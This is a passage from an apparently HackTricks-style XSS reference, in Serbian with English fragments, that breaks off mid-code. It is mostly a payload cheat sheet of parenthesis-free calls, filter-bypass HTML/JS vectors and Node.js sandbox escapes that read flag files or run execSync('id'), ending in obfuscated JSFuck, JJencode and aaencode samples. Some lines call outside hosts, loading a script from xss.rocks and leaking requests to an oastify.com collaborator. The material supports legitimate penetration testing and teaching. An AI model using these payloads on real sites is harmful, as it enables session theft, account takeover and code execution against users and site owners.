**JavaScript comments (preuzeto iz** [**JavaScript Comments**](#javascript-comments) **)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (od** [**JavaScript new line**](#javascript-new-lines) **trika)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript razmaci**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript unutar komentara**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bez zagrada**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Poziv proizvoljne funkcije (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Postoji **JS code** koji koristi **nebezbedne podatke koje kontroliše napadač** kao što je `location.href`. Napadač može zloupotrebiti ovo da izvrši proizvoljni JS kod.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Tamo ćete naći detaljno **explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them**.\
Takođe, ne zaboravite da **at the end of the mentioned post** možete naći objašnjenje o [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

Ako možete da pokrenete XSS slanjem payload-a unutar cookie-ja, to je obično self-XSS. Međutim, ako nađete **vulnerable subdomain to XSS**, možete zloupotrebiti ovaj XSS da ubacite cookie za čitav domen i na taj način izazovete cookie XSS u glavnom domenu ili drugim poddomenima (onima koji su ranjivi na cookie XSS). Za ovo možete koristiti cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Možete naći odličnu zloupotrebu ove tehnike u [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Moguće je da korisnik podeli svoj profil sa adminom i ako je self XSS u profilu tog korisnika, kada admin pristupi, pokrenuće ranjivost.

### Session Mirroring

Ako nađete neki self XSS i web stranica ima **session mirroring for administrators**, na primer omogućava klijentima da zatraže pomoć i tako admin vidi ono što vi vidite u svojoj sesiji, ali iz njegove sesije.

Možete naterati **administrator** da pokrene vaš self XSS i ukrasti njegove cookies/session.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

Kada web aplikacija koristi Emscripten/WASM, konstantni stringovi (kao HTML format stubs) se nalaze u writable linear memory. Jedan in‑WASM overflow (npr. unchecked memcpy u edit path) može korumpirati susedne strukture i preusmeriti upise ka tim konstantama. Prepisivanjem template-a kao što je "<article><p>%.*s</p></article>" u "<img src=1 onerror=%.*s>" sanitizovani input postaje JavaScript handler vrednost i dovodi do trenutnog DOM XSS prilikom renderovanja.

Proverite posvećenu stranicu sa workflow-om eksploatacije, DevTools memory helpers, i odbranama:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Možete proveriti da li se **reflected values** unicode normalize-uju na serveru (ili na klijentskoj strani) i zloupotrebiti ovu funkcionalnost da zaobiđete zaštite. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Zbog **RoR mass assignment** navodnici se ubacuju u HTML i time se zaobilazi ograničenje navodnika, pa se dodatna polja (onfocus) mogu dodati unutar taga.\
Primer formulara ([from this report](https://hackerone.com/reports/709336)), ako pošaljete payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Par "Key","Value" će biti vraćen ovako:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Tada će atribut onfocus biti umetnut i XSS će se dogoditi.

### Special combinations
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS sa injekcijom headera u 302 odgovoru

If you find that you can **inject headers in a 302 Redirect response** you could try to **make the browser execute arbitrary JavaScript**. This is **not trivial** as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\ Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Samo slova, brojevi i tačke

If you are able to indicate the **callback** that javascript is going to **execute** limited to those chars. [**Read this section of this post**](#javascript-function) to find how to abuse this behaviour.

### Validni `<script>` Content-Types za XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Jedini **Content-Type**s koji će podržati Chrome da pokrene **loaded script** su oni unutar const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Tipovi script-a za XSS

(Iz [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Dakle, koji tipovi mogu biti navedeni da učitaju script?
```html
<script type="???"></script>
```
Odgovor je:

- **module** (podrazumevano, nema potrebe za objašnjenjem)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles je funkcija koja vam omogućava da spakujete više podataka (HTML, CSS, JS…) u jedan **`.wbn`** fajl.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Omogućava poboljšanje import sintakse
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Ovo ponašanje je iskorišćeno u [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) da bi se preslikala biblioteka na eval kako bi njena zloupotreba mogla pokrenuti XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Ova funkcionalnost je prvenstveno uvedena da reši neke probleme izazvane pre-renderingom. Radi ovako:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types za XSS

(Iz [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Sledeći content types mogu izvršiti XSS u svim browserima:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

U drugim browserima drugi **`Content-Types`** mogu biti iskorišćeni za izvršavanje proizvoljnog JS, pogledaj: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Ako stranica vraća text/xml content-type moguće je označiti namespace i izvršiti proizvoljan JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Posebni obrasci zamene

When something like **`"some {{template}} data".replace("{{template}}", <user_input>)`** is used. The attacker could use [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) to try to bypass some protections: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

For example in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), this was used to **scape a JSON string** inside a script and execute arbitrary code.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Ako imate ograničen skup znakova koje možete koristiti, pogledajte ova druga validna rešenja za XSJail probleme:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Ako je **everything is undefined** pre izvršavanja untrusted code (kao u [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), moguće je generisati korisne objekte „iz ničega” za zloupotrebu izvršavanja arbitrary untrusted code:

- Korišćenjem import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Pristupanje `require` indirektno

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) moduli su u Node.js umotani u funkciju, kao što sledi:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Dakle, ako iz tog modula možemo **pozvati drugu funkciju**, moguće je iz te funkcije koristiti `arguments.callee.caller.arguments[1]` da pristupimo **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Na sličan način kao u prethodnom primeru, moguće je **use error handlers** kako biste pristupili **wrapper** modula i dobili **`require`** funkciju:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Različite obfuscations na jednoj stranici:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Napredniji JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
